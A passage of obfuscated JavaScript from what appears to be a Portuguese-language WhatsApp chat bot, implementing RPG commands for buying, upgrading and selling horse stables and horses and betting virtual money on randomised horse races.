              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              MD = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MD) - 500;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("Parabéns pela compra do estábulo... Agora você pode comprar cavalos para correr com eles 🐴");
              break;
            case "venderestabulo":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um estábulo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              _0x3529b0 = sabrpg.map(_0x4249c8 => _0x4249c8.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x5cfac3 => _0x5cfac3.id).indexOf(_0x32e455);
              TT1 = Number(cavalosrpg[AC].cavalos.length) * 500;
              TT2 = Number(cavalosrpg[AC].level) * 200;
              TT3 = Number(cavalosrpg[AC].countVc) * 100;
              TT4 = Number(TT1) + Number(TT2) + Number(TT3);
              cavalosrpg.splice(AC, 1);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              MD = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MD) + Number(TT4);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602(_0x6965b0 + " " + sabrpg[_0x3529b0].nome + ", seu estábulo ficou avaliado em R$ " + Number(TT4).toFixed(2) + "\n📈 Parabéns pela venda...");
              break;
            case "avaliarestabulo":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um estábulo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              AC = cavalosrpg.map(_0x27ec34 => _0x27ec34.id).indexOf(_0x32e455);
              TT1 = Number(cavalosrpg[AC].cavalos.length) * 500;
              TT2 = Number(cavalosrpg[AC].level) * 200;
              TT3 = Number(cavalosrpg[AC].countVc) * 100;
              TT4 = Number(TT1) + Number(TT2) + Number(TT3);
              txt = "ㅤㅤㅤ〘 *AVALIANDO* 〙\n🐴 *Preço Por Cavalos:* R$ " + Number(TT1).toFixed(2) + "\n📈 *Preço Por Upgrade:* R$ " + Number(TT2).toFixed(2) + "\n🏆 *Preço Por Vitórias:* R$ " + Number(TT3).toFixed(2) + "\n\n🤑 *Total:* R$ " + Number(TT4).toFixed(2) + "\n\n-> Use " + _0x1d93be + "venderestabulo caso queira se desfazer do mesmo.";
              _0x403602(txt);
              break;
            case "estabulo":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um estábulo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              _0x3529b0 = sabrpg.map(_0x1a0be0 => _0x1a0be0.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x2b20bd => _0x2b20bd.id).indexOf(_0x32e455);
              AD = cavalosrpg[AC].cavalos.map(_0x598576 => _0x598576.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
              if (Number(cavalosrpg[AC].cavalos.length) <= 0) {
                countcav = "\n『 Você não possui cavalos... 』\n";
              } else {
                countcav = "\n🐎 *Cavalos ↴*";
                for (c = 0; c < cavalosrpg[AC].cavalos.length; c++) {
                  if (cavalosrpg[AC].cavalos[c].sela == true) {
                    selainfo = "✅";
                  } else {
                    selainfo = "❌";
                  }
                  if (cavalosrpg[AC].cavalos[c].dor == true) {
                    dorinfo = "✅";
                  } else {
                    dorinfo = "❌";
                  }
                  if (cavalosrpg[AC].cavalos[c].fratura == true) {
                    fratinfo = "✅";
                  } else {
                    fratinfo = "❌";
                  }
                  TTCV = Number(cavalosrpg[AC].cavalos[c].viccav) / Number(Number(cavalosrpg[AC].cavalos[c].viccav) + Number(cavalosrpg[AC].cavalos[c].dercav)) * 100;
                  if (Number(TTCV) > 0) {
                    PVCV = TTCV;
                  } else {
                    PVCV = 0;
                  }
                  countcav += "\n» " + (Number(c) + 1) + " « Nome Do Cavalo: *" + cavalosrpg[AC].cavalos[c].nomedocavalo + "*\n• Velocidade: *" + (Number(cavalosrpg[AC].cavalos[c].tipo) + 1) + "x*\n• Sela: *" + selainfo + "*\n• Doente *" + dorinfo + "*\n• Fraturado: *" + fratinfo + "*\n• Vitórias: *" + cavalosrpg[AC].cavalos[c].viccav + "*\n• Percentual de Ganhos: *" + Number(PVCV).toFixed(1) + "%*\n• Apostas: *R$ " + Number(cavalosrpg[AC].cavalos[c].contdin).toFixed(2) + "*\n• Ganhos: *R$ " + Number(cavalosrpg[AC].cavalos[c].lucdin).toFixed(2) + "*\n";
                }
              }
              txt = "👤 Nome: *" + sabrpg[_0x3529b0].nome + "*\n💯 Level do Estábulo: *" + cavalosrpg[AC].level + "*\n📐 Tamanho Do Estábulo: " + Number(cavalosrpg[AC].level) * 5 + " m²*\n🧮 Quantidade De Cavalos: *" + cavalosrpg[AC].cavalos.length + "*\n🔔 Cavalo Selecionado: *" + cavalosrpg[AC].setcav + "*\n" + countcav;
              const _0x546f9e = {
                url: "" + logoslink.logo
              };
              const _0xbfd00e = {
                image: _0x546f9e,
                caption: txt
              };
              const _0x5ac7df = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0xbfd00e, _0x5ac7df);
              break;
            case "setcavalo":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um cavalo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              AC = cavalosrpg.map(_0x252c1a => _0x252c1a.id).indexOf(_0x32e455);
              if (!_0x1d6557) {
                return _0x403602("Diga o nome de um dos cavalos presentes no seu estábulo...\nEx: " + (_0x1d93be + _0x3dec88) + " Patolino");
              }
              if (!JSON.stringify(cavalosrpg[AC].cavalos).includes(_0x1d6557.toLowerCase())) {
                return _0x403602("Este cavalo não consta eu seus registros... Use o comando " + _0x1d93be + "estabulo, e verifique quais cavalos você tem 🐴");
              }
              cavalosrpg[AC].setcav = _0x1d6557.toLowerCase();
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              _0x403602("Cavalo definido com sucesso...");
              break;
            case "upcavalo":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um cavalo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              _0x3529b0 = sabrpg.map(_0x288dee => _0x288dee.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x408fd3 => _0x408fd3.id).indexOf(_0x32e455);
              if (Number(cavalosrpg[AC].level) < 4) {
                AT = Number(cavalosrpg[AC].level) * 200;
                if (Number(sabrpg[_0x3529b0].money) < Number(AT)) {
                  return _0x403602("Você não saldo suficiente para upar seu estábulo...");
                }
                LC = cavalosrpg[AC].level;
                cavalosrpg[AC].level = Number(LC) + 1;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                MC = sabrpg[_0x3529b0].money;
                sabrpg[_0x3529b0].money = Number(MC) - Number(AT);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602(" Agrademos a confiança na *Black Construction...* R$ " + Number(AT).toFixed(2) + " foram investidos, e seu estábulo está no level " + cavalosrpg[AC].level + " 🐴");
              } else {
                _0x403602("Seu estábulo já alcançou o tamanho máximo...");
              }
              break;
            case "comprarcavalo":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um estábulo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              var [_0x29b7ee, _0x49f244] = _0x1d6557.split("/");
              if (!_0x29b7ee) {
                return _0x403602("Escolha um cavalo...");
              }
              if (!_0x49f244) {
                return _0x403602("Agora dê um nome para seu cavalo... Ex: " + (_0x1d93be + _0x3dec88) + " " + _0x1d6557 + "/Michael");
              }
              if (Number(_0x49f244.length) > 20) {
                return _0x403602("Este nome é muito grande...");
              }
              if (Number(_0x29b7ee) === 1 || Number(_0x29b7ee) === 2 || Number(_0x29b7ee) === 3 || Number(_0x29b7ee) === 4) {
                _0x3529b0 = sabrpg.map(_0x76fb60 => _0x76fb60.id).indexOf(_0x32e455);
                AC = cavalosrpg.map(_0x1d3181 => _0x1d3181.id).indexOf(_0x32e455);
                MCV1 = Number(_0x29b7ee) - 1;
                MCV2 = Number(MCV1) * 500;
                MCV3 = Number(MCV2) + 500;
                if (Number(sabrpg[_0x3529b0].money) < Number(MCV3)) {
                  return _0x403602("Você não saldo suficiente para comprar este cavalo...");
                }
                if (JSON.stringify(cavalosrpg[AC].cavalos).includes(_0x49f244)) {
                  return _0x403602("Você já tem um cavalo com esse nome... Pfvr, escolha outro nome 🐴");
                }
                if (Number(cavalosrpg[AC].cavalos.length) == Number(cavalosrpg[AC].level)) {
                  return _0x403602("Você atingiu o número máximo de cavalos no estábulo... Caso queira aumentar o tamanho do estábulo, use " + _0x1d93be + "upcavalo");
                }
                cavalosrpg[AC].cavalos.push({
                  nomedocavalo: _0x49f244.toLowerCase(),
                  tipo: Number(_0x29b7ee) - 1,
                  sela: false,
                  dor: false,
                  fratura: false,
                  viccav: 0,
                  dercav: 0,
                  contdin: 0,
                  lucdin: 0
                });
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                sabrpg[_0x3529b0].money -= Number(MCV3);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("Parabéns pela compra do cavalo... Espero que faça bom proveito com ele 🐴");
              } else {
                _0x403602("Esse cavalo não está disponível para compra...");
              }
              break;
            case "vendercavalo":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um cavalo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              _0x3529b0 = sabrpg.map(_0x5c1950 => _0x5c1950.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x56036c => _0x56036c.id).indexOf(_0x32e455);
              AD = cavalosrpg[AC].cavalos.map(_0x45de73 => _0x45de73.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
              if (Number(cavalosrpg[AC].cavalos.length) <= 0) {
                return _0x403602("Você não possui cavalos... Acho bom comprar um 🐴");
              }
              if (!JSON.stringify(cavalosrpg[AC].cavalos).includes(cavalosrpg[AC].setcav)) {
                return _0x403602("Você precisa definir o cavalo que irá vender... Use o comando " + _0x1d93be + "setcavalo");
              }
              if (cavalosrpg[AC].cavalos[AD].sela == true) {
                HCS = 100;
              } else {
                HCS = 0;
              }
              if (cavalosrpg[AC].cavalos[AD].dor == true) {
                HCD = 50;
              } else {
                HCD = 0;
              }
              if (cavalosrpg[AC].cavalos[AD].fratura == true) {
                HCF = 125;
              } else {
                HCF = 0;
              }
              HCV = Number(Number(Number(cavalosrpg[AC].cavalos[AD].tipo) + 1) * 250) + Number(HCS) - Number(HCD) - Number(HCF) + Number(cavalosrpg[AC].cavalos[AD].viccav);
              MB = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MB) + Number(HCV);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              cavalosrpg[AC].cavalos.splice(AD, 1);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              _0x403602("Seu cavalo ficou avaliado em R$ " + Number(HCV).toFixed(2) + " 🐴📈 - Parabéns pela venda...");
              break;
            case "comprarsela":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um cavalo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              _0x3529b0 = sabrpg.map(_0xadf57f => _0xadf57f.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x4a7941 => _0x4a7941.id).indexOf(_0x32e455);
              AD = cavalosrpg[AC].cavalos.map(_0x13ceb8 => _0x13ceb8.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
              if (Number(cavalosrpg[AC].cavalos.length) <= 0) {
                return _0x403602("Você não possui cavalos... Acho bom comprar um cavalo!🐴");
              }
              if (!JSON.stringify(cavalosrpg[AC].cavalos).includes(cavalosrpg[AC].setcav)) {
                return _0x403602("Você precisa definir o cavalo que irá correr... Use o comando " + _0x1d93be + "setcavalo");
              }
              if (cavalosrpg[AC].cavalos[AD].sela == true) {
                return _0x403602("Você já possui uma sela neste cavalo...");
              }
              if (Number(sabrpg[_0x3529b0].money) < 200) {
                return _0x403602("Você não tem saldo suficiente para efetuar essa compra...");
              }
              cavalosrpg[AC].cavalos[AD].sela = true;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              MC = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MC) - 200;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("Uma sela foi comprada para o seu alazão com sucesso... 🐴");
              break;
            case "cdcv3":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um cavalo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              _0x3529b0 = sabrpg.map(_0x5e6276 => _0x5e6276.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x38fe6c => _0x38fe6c.id).indexOf(_0x32e455);
              AD = cavalosrpg[AC].cavalos.map(_0x4183b2 => _0x4183b2.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
              if (Number(cavalosrpg[AC].cavalos.length) <= 0) {
                return _0x403602("Você não possui cavalos... Acho bom comprar um 🐴");
              }
              if (!JSON.stringify(cavalosrpg[AC].cavalos).includes(cavalosrpg[AC].setcav)) {
                return _0x403602("Você precisa definir o cavalo que irá correr... Use o comando " + _0x1d93be + "setcavalo");
              }
              if (cavalosrpg[AC].cavalos[AD].dor == false) {
                return _0x403602("Seu cavalo não está doente...");
              }
              if (Number(sabrpg[_0x3529b0].money) < 100) {
                return _0x403602("Você não tem saldo suficiente para efetuar essa compra...");
              }
              cavalosrpg[AC].cavalos[AD].dor = false;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              MC = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MC) - 100;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("Seu cavalo recebeu uma injeção poderosa, e está pronto para correr dnv... 🐴");
              break;
            case "atadura":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um cavalo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              _0x3529b0 = sabrpg.map(_0x7ba699 => _0x7ba699.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x2abb73 => _0x2abb73.id).indexOf(_0x32e455);
              AD = cavalosrpg[AC].cavalos.map(_0x384169 => _0x384169.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
              if (Number(cavalosrpg[AC].cavalos.length) <= 0) {
                return _0x403602("Você não possui cavalos... Acho bom comprar um 🐴");
              }
              if (!JSON.stringify(cavalosrpg[AC].cavalos).includes(cavalosrpg[AC].setcav)) {
                return _0x403602("Você precisa definir o cavalo que irá correr... Use o comando " + _0x1d93be + "setcavalo");
              }
              if (cavalosrpg[AC].cavalos[AD].fratura == false) {
                return _0x403602("Seu cavalo não está fraturado...");
              }
              if (Number(sabrpg[_0x3529b0].money) < 250) {
                return _0x403602("Você não tem saldo suficiente para efetuar essa compra...");
              }
              cavalosrpg[AC].cavalos[AD].fratura = false;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
              MC = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MC) - 250;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("Atadura colocada com sucesso... Agora deixe seu bichinho descansar 🐴");
              break;
            case "cavalo":
            case "cavalos":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um cavalo primeiro... Consulte a " + _0x1d93be + "lojadecavalos");
              }
              horacav = moment.tz("America/Sao_Paulo").format("HH");
              diacav = moment.tz("America/Sao_Paulo").format("DD");
              mmcav = moment.tz("America/Sao_Paulo").format("MM");
              _0x3529b0 = sabrpg.map(_0x48dcfd => _0x48dcfd.id).indexOf(_0x32e455);
              AC = cavalosrpg.map(_0x464c18 => _0x464c18.id).indexOf(_0x32e455);
              AD = cavalosrpg[AC].cavalos.map(_0x324123 => _0x324123.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
              if (Number(_0x40e45c[0]) > Number(sabrpg[_0x3529b0].money)) {
                return _0x403602("Você não possui saldo suficiente para efetuar essa aposta...");
              }
              if (Number(cavalosrpg[AC].cavalos.length) <= 0) {
                return _0x403602("Você não possui cavalos... Acho bom comprar um 🐴");
              }
              if (!JSON.stringify(cavalosrpg[AC].cavalos).includes(cavalosrpg[AC].setcav)) {
                return _0x403602("Você precisa definir o cavalo que irá correr... Use o comando " + _0x1d93be + "setcavalo");
              }
              if (cavalosrpg[AC].cavalos[AD].sela == false) {
                return _0x403602("Você precisa comprar uma sela para seu alazão...");
              }
              if (cavalosrpg[AC].cavalos[AD].dor == true) {
                return _0x403602("Seu cavalo está doente... Compre uma _\"cdcv3\"_ na loja de CAVALOS para ele voltar a correr 💉");
              }
              if (cavalosrpg[AC].cavalos[AD].fratura == true) {
                return _0x403602("Seu cavalo está com a pata torcida... Vá comprar uma atadura para tratar isso 🐴");
              }
              if (Number(cavalosrpg[AC].corridaL) === 0 && Number(cavalosrpg[AC].corridaH) === Number(horacav) && Number(cavalosrpg[AC].corridaD) === Number(diacav) && Number(cavalosrpg[AC].corridaM) === Number(mmcav)) {
                return _0x403602("Seu cavalo parece cansado... Pfvr, volte mais tarde 🐴");
              }
              if (Number(horacav) > Number(cavalosrpg[AC].corridaH) && Number(cavalosrpg[AC].corridaD) === Number(diacav) && Number(cavalosrpg[AC].corridaM) === Number(mmcav)) {
                cavalosrpg[AC].corridaL = 20;
                cavalosrpg[AC].corridaH = horacav;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                _0x403602("Seu cavalo parece ótimo... Você já pode correr dnv 🐴");
              }
              if (Number(diacav) > Number(cavalosrpg[AC].corridaD) && Number(cavalosrpg[AC].corridaM) === Number(mmcav)) {
                cavalosrpg[AC].corridaL = 20;
                cavalosrpg[AC].corridaH = horacav;
                cavalosrpg[AC].corridaD = diacav;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                _0x403602(_0x6965b0 + " " + sabrpg[_0x3529b0].nome + ", seu cavalo está pronto para correr ?");
              }
              if (Number(mmcav) > Number(cavalosrpg[AC].corridaM)) {
                cavalosrpg[AC].corridaL = 20;
                cavalosrpg[AC].corridaH = horacav;
                cavalosrpg[AC].corridaD = diacav;
                cavalosrpg[AC].corridaM = mmcav;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                _0x403602("Um novo mês de vitórias se inicia...");
              }
              if (Number(cavalosrpg[AC].corridaL) > 0 && Number(cavalosrpg[AC].corridaH) === Number(horacav)) {
                if (!_0x1d6557) {
                  return _0x403602("A corrida já vai começar... Faça logo a sua aposta");
                }
                if (!Number(_0x40e45c[0])) {
                  return _0x403602(_0x40e45c[0] + " não é número...");
                }
                if (Number(_0x40e45c[0]) < 100) {
                  return _0x403602("Nossas apostas são de alto nível aqui... Você não pode apostar menos de R$ 100.00");
                }
                if (Number(_0x40e45c[0]) > 10000) {
                  return _0x403602("Nossas apostas são de alto nível aqui... Mas você não pode apostar mais do que R$ 10000.00");
                }
                MT = Math.floor(Math.random() * 40);
                if (Number(MT) === 0) {
                  GB = cavalosrpg.map(_0xa346df => _0xa346df.id).indexOf(_0x32e455);
                  GF = cavalosrpg[GB].cavalos.map(_0x138edc => _0x138edc.nomedocavalo).indexOf(cavalosrpg[GB].setcav);
                  cavalosrpg[AC].corridaL = 20;
                  cavalosrpg[AC].corridaH = horacav;
                  cavalosrpg[AC].corridaD = diacav;
                  cavalosrpg[AC].corridaM = mmcav;
                  cavalosrpg[GB].cavalos.splice(GF, 1);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                  acidente = ["Seu cavalo se acidentou na pista e morreu... Meus sentimentos ao alazão 🖤", "Seu cavalo adoeceu gravemente antes da corrida, e morreu... Meus pêsames pelo seu amigo 🖤"];
                  _0x403602(acidente[Math.floor(Math.random() * acidente.length)]);
                }
                if (Number(MT) === 1) {
                  cavalosrpg[AC].cavalos[AD].dor = true;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                  _0x403602("Seu cavalo adoeceu, mas felizmente, essa doença não é para a morte... Vá comprar a _\"cdcv3\",_ uma vacina poderosa que vai levantar o seu alazão na hora 💉");
                }
                if (Number(MT) === 2) {
                  cavalosrpg[AC].cavalos[AD].fratura = true;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                  _0x403602("🥹 Seu alazão fraturou a patinha enquanto corria... Vá comprar uma atadura na " + _0x1d93be + "lojadecavalos");
                }
                if (Number(MT) > 2) {
                  cavt1 = _0x2a5ff3 ? 1 : Math.floor(Math.random() * 19) + 1;
                  cavt2 = Number(cavt1) - Number(cavalosrpg[AC].cavalos[AD].tipo);
                  if (Number(cavt2) < 1) {
                    var _0x2bb232 = 1;
                  } else {
                    var _0x2bb232 = cavt2;
                  }
                  if (Number(_0x2bb232) === 1) {
                    cav2 = Number(_0x40e45c[0]) + Number(_0x40e45c[0]) / 2;
                    DCV = cavalosrpg[AC].cavalos.map(_0x32b53b => _0x32b53b.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
                    MC = sabrpg[_0x3529b0].money;
                    sabrpg[_0x3529b0].money = Number(MC) + Number(cav2);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    if (Number(cavalosrpg[AC].countDc) > 0) {
                      L1 = 1;
                    } else {
                      L1 = 0;
                    }
                    if (Number(cavalosrpg[AC].cavalos[DCV].dercav) > 0) {
                      LC1 = 1;
                    } else {
                      LC1 = 0;
                    }
                    LM = cavalosrpg[AC].corridaL;
                    CV = cavalosrpg[AC].countVc;
                    CCD = cavalosrpg[AC].countDc;
                    CVC = cavalosrpg[AC].capitalVc;
                    CVCS = cavalosrpg[AC].cavalos[DCV].viccav;
                    CDCS = cavalosrpg[AC].cavalos[DCV].dercav;
                    DTCS = cavalosrpg[AC].cavalos[DCV].contdin;
                    DVCS = cavalosrpg[AC].cavalos[DCV].lucdin;
                    cavalosrpg[AC].corridaL = Number(LM) - 1;
                    cavalosrpg[AC].countVc = Number(CV) + 1;
                    cavalosrpg[AC].countDc = Number(CCD) - Number(L1);
                    cavalosrpg[AC].capitalVc = Number(CVC) + Number(cav2);
                    cavalosrpg[AC].cavalos[DCV].viccav = Number(CVCS) + 1;
                    cavalosrpg[AC].cavalos[DCV].dercav = Number(CDCS) - Number(LC1);
                    cavalosrpg[AC].cavalos[DCV].contdin = Number(DTCS) + Number(_0x40e45c[0]);
                    cavalosrpg[AC].cavalos[DCV].lucdin = Number(DVCS) + Number(cav2);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                    _0x403602("🐎 A corrida terminou, e seu cavalo chegou em " + _0x2bb232 + "º lugar... Você ganhou R$ " + Number(cav2).toFixed(2));
                  }
                  ;
                  if (Number(_0x2bb232) === 2) {
                    DCV = cavalosrpg[AC].cavalos.map(_0x1e3a65 => _0x1e3a65.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
                    cav2 = _0x40e45c[0];
                    MC = sabrpg[_0x3529b0].money;
                    sabrpg[_0x3529b0].money = Number(MC) + Number(cav2);
